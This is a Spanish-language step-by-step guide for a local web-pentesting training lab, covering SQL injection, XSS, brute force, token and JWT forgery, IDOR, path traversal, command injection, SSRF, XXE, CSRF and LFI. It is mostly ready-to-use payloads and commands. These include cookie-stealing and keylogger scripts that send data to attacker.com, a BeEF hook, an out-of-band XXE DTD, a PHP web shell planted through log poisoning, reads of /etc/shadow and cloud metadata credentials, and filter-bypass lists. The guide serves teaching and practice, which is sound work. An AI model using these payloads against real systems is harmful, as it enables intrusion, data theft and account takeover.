# 📖 GUÍA PRÁCTICA — HackLab Academy
## Cómo usar el laboratorio paso a paso

> **Para principiantes en Kali Linux y pentesting web**

---

## ANTES DE EMPEZAR

### ¿Qué necesitas?
- Kali Linux (VM o instalación nativa)
- Navegador web (Firefox viene en Kali)
- Burp Suite Community (viene preinstalado en Kali)
- Terminal

### Configuración inicial (5 minutos)

**1. Descarga el laboratorio:**
```bash
# Opción A — Desde GitHub (si está publicado)
git clone https://github.com/usuario/hacklab-academy.git
cd hacklab-academy

# Opción B — Si tienes el archivo index.html
mkdir hacklab && mv index.html hacklab/ && cd hacklab
```

**2. Inicia el servidor:**
```bash
python3 -m http.server 8080
```

**3. Verifica que funciona:**
```bash
# En otra terminal
curl http://localhost:8080
# Debes ver el HTML de la plataforma
```

**4. Abre en el navegador:**
```
http://localhost:8080
```

---

## MÓDULO 1 — SQL INJECTION 💉

### ¿Qué es?
SQL Injection permite insertar código SQL malicioso en campos de entrada para manipular la base de datos. Es una de las vulnerabilidades más antiguas y aún prevalentes.

### Lab 1A: Login Bypass

**Objetivo:** Autenticarse sin conocer la contraseña

**Paso 1 — Entender la consulta vulnerable:**
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

**Paso 2 — Inyectar el payload:**
- Campo usuario: `admin' --`
- Campo contraseña: (cualquier cosa)

**¿Por qué funciona?**
La consulta queda así:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='cualquier'
```
El `--` comenta el resto. El AND password queda ignorado.

**Otros payloads para probar:**
```
' OR '1'='1
' OR 1=1 --
admin'/*
") OR ("1"="1
```

**Con Burp Suite:**
1. Activa el proxy en Firefox: `127.0.0.1:8080`
2. Ve al login e intercepta el request
3. Modifica el parámetro `username` en Burp Repeater
4. Observa la respuesta

---

### Lab 1B: UNION Attack

**Objetivo:** Extraer todos los usuarios y contraseñas

**Paso 1 — Determinar número de columnas:**
```
1 ORDER BY 1 --    ← Sin error
1 ORDER BY 2 --    ← Sin error  
1 ORDER BY 3 --    ← Error = hay 2 columnas
```

**Paso 2 — Encontrar columnas visibles:**
```
0 UNION SELECT NULL,NULL --
0 UNION SELECT 'a','b' --
```

**Paso 3 — Extraer datos:**
```
0 UNION SELECT username,password FROM users --
```

**Paso 4 — Enumerar la BD:**
```
0 UNION SELECT table_name,2 FROM information_schema.tables --
0 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' --
```

**Con sqlmap (automatizado):**
```bash
# Básico
sqlmap -u "http://localhost:8080/?id=1" --dbs

# Extraer tablas
sqlmap -u "http://localhost:8080/?id=1" -D nombre_db --tables

# Extraer datos
sqlmap -u "http://localhost:8080/?id=1" -D nombre_db -T users --dump

# En formulario POST
sqlmap -u "http://localhost:8080/login" --data="username=admin&password=test" --dbs
```

---

### Lab 1C: Blind SQL Injection

**Objetivo:** Extraer datos cuando no hay output visible

**Boolean-based:**
```
# TRUE — respuesta normal
1 AND 1=1 --

# FALSE — respuesta diferente
1 AND 1=2 --

# Extraer char a char
1 AND SUBSTRING(username,1,1)='a' --
1 AND SUBSTRING(username,1,1)='b' --
... (hasta encontrar el char correcto)
```

**Time-based (cuando no hay diferencia visual):**
```sql
1 AND SLEEP(5) --           -- MySQL
1 AND pg_sleep(5) --        -- PostgreSQL  
1 AND WAITFOR DELAY '0:0:5' -- MSSQL
```

**Con sqlmap automático:**
```bash
sqlmap -u "URL" --technique=B  # Boolean-based
sqlmap -u "URL" --technique=T  # Time-based
```

---

## MÓDULO 2 — CROSS-SITE SCRIPTING (XSS) 🕸

### ¿Qué es?
XSS permite inyectar JavaScript malicioso en páginas web. El código se ejecuta en el navegador de la víctima, no en el servidor.

### Lab 2A: XSS Reflejado

**Objetivo:** Ejecutar JavaScript en el contexto de otro usuario

**Payloads básicos:**
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(document.domain)>
```

**Bypass de filtros comunes:**
```html
<!-- Si filtran <script> -->
<img src=x onerror=alert(1)>

<!-- Si filtran "alert" -->
<script>confirm(1)</script>
<script>prompt(1)</script>

<!-- Case mixing -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<script>&#97;lert(1)</script>
```

**Robo de cookies (simulado):**
```html
<script>
  fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```

**Keylogger:**
```html
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?k='+e.key)
}
</script>
```

**Con Burp Suite:**
1. Intercepta el request del buscador
2. En Repeater, modifica el parámetro de búsqueda
3. Prueba diferentes payloads
4. Observa si el HTML de respuesta los incluye sin escapar

---

### Lab 2B: XSS Almacenado

**Diferencia clave:** El payload se guarda en la base de datos y afecta a TODOS los usuarios que visiten la página.

**Payload en campo de comentario:**
```html
<script>alert('XSS Almacenado - Víctima: '+document.cookie)</script>
```

**Impacto real:**
```html
<!-- Redirigir a phishing -->
<script>window.location='https://phishing.com/fake-login'</script>

<!-- Defacement -->
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>

<!-- BeEF hook (en entorno real) -->
<script src="http://attacker.com:3000/hook.js"></script>
```

---

## MÓDULO 3 — AUTENTICACIÓN ROTA 🔓

### Lab 3A: Credenciales Débiles

**Listas de contraseñas comunes:**
```
admin, password, 1234, 12345, 123456
admin123, root, toor, pass, test
qwerty, letmein, welcome, monkey
```

**Wordlists en Kali:**
```bash
ls /usr/share/wordlists/
# rockyou.txt es la más famosa
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

### Lab 3B: Fuerza Bruta con Hydra

```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP GET
hydra -l admin -P wordlist.txt localhost http-get /login

# Con múltiples usuarios
hydra -L users.txt -P passwords.txt localhost http-post-form \
  "/login:user=^USER^&pass=^PASS^:Wrong"
```

**Con Burp Suite Intruder:**
1. Intercepta el request de login
2. Mándalo al Intruder (Ctrl+I)
3. Marca el campo contraseña como posición
4. Carga una wordlist
5. Lanza el ataque
6. Filtra por longitud de respuesta diferente

---

### Lab 3C: Manipulación de Tokens de Sesión

**Decodificar token base64:**
```bash
echo "NToxNzAwMDAwMDAwMDAwMA==" | base64 -d
# Output: 5:1700000000000 (userId:timestamp)
```

**Forjar token de admin:**
```bash
# Cambiar userId=5 a userId=1 (admin)
echo -n "1:1700000000000" | base64
# Usar el nuevo token en las cookies
```

**Con Python:**
```python
import base64

# Decodificar
token = "NToxNzAwMDAwMDAwMDAwMA=="
decoded = base64.b64decode(token).decode()
print(f"Original: {decoded}")

# Forjar
forged = base64.b64encode(b"1:1700000000000").decode()
print(f"Forjado: {forged}")
```

---

## MÓDULO 4 — IDOR 📂

### Lab 4A: IDOR en API

**Identificar el patrón:**
```bash
# Eres el usuario 5, el endpoint es:
GET /api/users/5

# Prueba otros IDs:
curl http://localhost:8080/api/users/1
curl http://localhost:8080/api/users/2
# ...
```

**Script de automatización:**
```python
import requests

for user_id in range(1, 20):
    r = requests.get(f"http://localhost:8080/api/users/{user_id}")
    if r.status_code == 200:
        print(f"[+] ID {user_id}: {r.json()}")
```

**Con Burp Suite:**
1. Intercepta el request a tu perfil
2. En Intruder, marca el número de ID
3. Usa payload tipo "Numbers" del 1 al 100
4. Filtra respuestas exitosas (200 OK)

---

### Lab 4B: Path Traversal

**Payloads:**
```
../../../etc/passwd
....//....//....//etc/passwd    (bypass de filtros)
%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL encoded)
..%252f..%252fetc%252fpasswd    (double URL encoded)
..%c0%af..%c0%afetc%c0%afpasswd (Unicode bypass)
```

**Archivos objetivo en Linux:**
```
/etc/passwd              ← Usuarios del sistema
/etc/shadow              ← Hashes de contraseñas (root)
/etc/hosts               ← Hosts internos
/proc/self/environ       ← Variables de entorno (con secretos)
/proc/self/cmdline       ← Comando del proceso actual
/var/log/apache2/access.log  ← Logs (para log poisoning)
../config.php            ← Configuración de BD
../.env                  ← Variables de entorno de la app
```

**Archivos objetivo en Windows:**
```
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
```

---

## MÓDULO 5 — JWT ATTACKS 🔑

### Entender la estructura JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header (base64)
.
eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGVybWlzc2lvbnMiOiJ1c2VyIn0  ← Payload (base64)
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
```

**Decodificar:**
```bash
# Decodificar payload manualmente
echo "eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGVybWlzc2lvbnMiOiJ1c2VyIn0" | base64 -d
# Output: {"username":"guest","permissions":"user"}
```

---

### Lab 5A: Ataque alg:none

**Concepto:** Algunos servidores aceptan tokens con algoritmo "none" (sin firma).

**Pasos:**
```bash
# 1. Tomar el token original y decodificar
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGVybWlzc2lvbnMiOiJ1c2VyIn0.firma"

# 2. Crear nuevo header con alg:none
NEW_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')

# 3. Crear payload modificado (user → admin)
NEW_PAYLOAD=$(echo -n '{"username":"guest","permissions":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')

# 4. Forjar token sin firma
FORGED="$NEW_HEADER.$NEW_PAYLOAD."

echo "Token forjado: $FORGED"
```

**Con jwt_tool (Kali):**
```bash
# Instalar
pip3 install jwt_tool

# Ataque alg:none
python3 jwt_tool.py TOKEN -X a

# Crack de secret
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

**Con hashcat:**
```bash
# Crackear secret del JWT
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
```

---

## MÓDULO 6 — COMMAND INJECTION 💻

### Lab 6A: Inyección Básica

**Operadores de inyección:**
```bash
;   # Secuencial (siempre ejecuta el segundo)
&&  # AND (ejecuta el segundo si el primero tiene éxito)
||  # OR (ejecuta el segundo si el primero falla)
|   # Pipe (pasa output al segundo)
`cmd`    # Subshell (backticks)
$(cmd)   # Subshell alternativo
```

**Ejemplos:**
```bash
# En campo de IP del ping:
8.8.8.8; whoami
8.8.8.8 && cat /etc/passwd
x || id
8.8.8.8 | ls -la
`cat /etc/shadow`
$(env)
```

**Bypass de filtros:**
```bash
# Si filtran ";" prueba:
%0a              # newline (URL encoded)
%0d%0a           # CRLF

# Si filtran espacios:
cat${IFS}/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}

# Si filtran palabras clave:
c'a't /etc/passwd
wh''oami
/bin/cat /etc/passwd
```

---

## MÓDULO 7 — SSRF 🌐

### Lab 7A: SSRF Básico

**Objetivo:** Hacer que el servidor acceda a recursos internos

**Payloads:**
```
http://127.0.0.1/admin
http://localhost:8080/internal
http://169.254.169.254/latest/meta-data/     ← AWS metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/              ← GCP metadata
http://169.254.169.254/metadata/v1/          ← DigitalOcean
```

**Acceder a servicios internos:**
```
http://localhost:6379/          ← Redis
http://localhost:5432/          ← PostgreSQL
http://localhost:27017/         ← MongoDB
http://internal-admin/          ← Paneles internos
http://192.168.0.1/             ← Router interno
```

**Bypass de filtros de IP:**
```
http://2130706433/              ← 127.0.0.1 en decimal
http://0x7f000001/              ← 127.0.0.1 en hex
http://[::1]/                   ← IPv6 localhost
http://127.1/                   ← Shorthand
http://0/                       ← También 127.0.0.1
```

---

## MÓDULO 8 — XXE 📄

### Lab 8A: Leer archivos del servidor

**Payload básico:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**XXE → SSRF:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

**Blind XXE (out-of-band):**
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

---

## MÓDULO 9 — CSRF 🔄

### Lab 9A: CSRF Básico

**Entender el ataque:**
CSRF engaña al navegador de la víctima para que realice acciones no deseadas en una web donde está autenticada.

**Página HTML maliciosa del atacante:**
```html
<!-- El atacante le envía esto a la víctima -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://victimsite.com/api/profile" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="password" value="nueva_pass">
  </form>
</body>
</html>
```

**CSRF con GET request:**
```html
<img src="http://victimsite.com/api/transfer?to=attacker&amount=1000">
```

**Identificar ausencia de token:**
- Revisa el HTML del formulario — ¿hay un `<input type="hidden" name="csrf_token">`?
- En Burp, ¿el POST body incluye algún token?
- Si no hay token → CSRF probablemente posible

---

## MÓDULO 10 — LFI / PATH TRAVERSAL 📁

### Lab 10A: Local File Inclusion

**Payloads progresivos:**
```
# Empezar simple
../../../etc/passwd

# Si hay filtro de "../":
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd

# Double encoding:
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte (PHP antiguo):
../../../etc/passwd%00.jpg
```

### Lab 10B: Log Poisoning → RCE

**Paso 1 — Verificar acceso al log:**
```
../../../var/log/apache2/access.log
../../../var/log/nginx/access.log
```

**Paso 2 — Inyectar código PHP en el User-Agent:**
```bash
curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' \
  http://localhost:8080/
```

**Paso 3 — Incluir el log con LFI y ejecutar:**
```
/page?file=../../../var/log/apache2/access.log&cmd=id
/page?file=../../../var/log/apache2/access.log&cmd=cat+/etc/passwd
```

---

## USANDO BURP SUITE — Guía Rápida

### Configuración inicial:
```
1. Abre Burp Suite
2. Proxy → Options → Listening on 127.0.0.1:8080
3. En Firefox: Settings → Network → Manual Proxy → 127.0.0.1:8080
4. Instala el certificado: http://burpsuite → CA Certificate
```

### Flujo básico de trabajo:
```
Proxy → Intercept ON → Hacer request en Firefox
→ Modifica en Burp → Forward
→ Manda al Repeater (Ctrl+R) para repetir
→ Manda al Intruder (Ctrl+I) para fuzzing
```

### Herramientas clave:
- **Repeater** — Repetir y modificar requests manualmente
- **Intruder** — Fuerza bruta y fuzzing automatizado
- **Scanner** (Pro) — Escaneo automático de vulnerabilidades
- **Decoder** — Codificar/decodificar base64, URL, HTML, etc.

---

## SCRIPTS ÚTILES EN PYTHON

### Fuzzer básico de parámetros:
```python
import requests

target = "http://localhost:8080/search"
payloads = ["'", '"', "<script>", "' OR 1=1 --", "../etc/passwd"]

for payload in payloads:
    r = requests.get(target, params={"q": payload})
    print(f"[{r.status_code}] {len(r.text)} bytes | Payload: {payload}")
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"  ⚠ Posible vulnerabilidad!")
```

### Brute force de IDs (IDOR):
```python
import requests

base_url = "http://localhost:8080/api/user"
cookies = {"session": "tu_token_aqui"}

for i in range(1, 50):
    r = requests.get(f"{base_url}/{i}", cookies=cookies)
    if r.status_code == 200 and "email" in r.text:
        print(f"[+] ID {i}: {r.json().get('email', 'N/A')}")
```

---

## CHECKLIST DE PENTESTING WEB

Antes de cada prueba, pregúntate:

```
□ ¿Tengo autorización por escrito?
□ ¿Entiendo la vulnerabilidad teóricamente?
□ ¿Sé cuál es el impacto real?
□ ¿Tengo el payload correcto?
□ ¿Sé cómo se parchea esta vulnerabilidad?
```

Después de cada éxito:
```
□ Capturé la flag
□ Entendí por qué funcionó
□ Sé cómo prevenirlo
□ Documenté el hallazgo
```

---

*HackLab Academy — Aprende. Practica. Defiende.* 🛡  
*Recuerda: El conocimiento es un arma. Úsala con responsabilidad.*
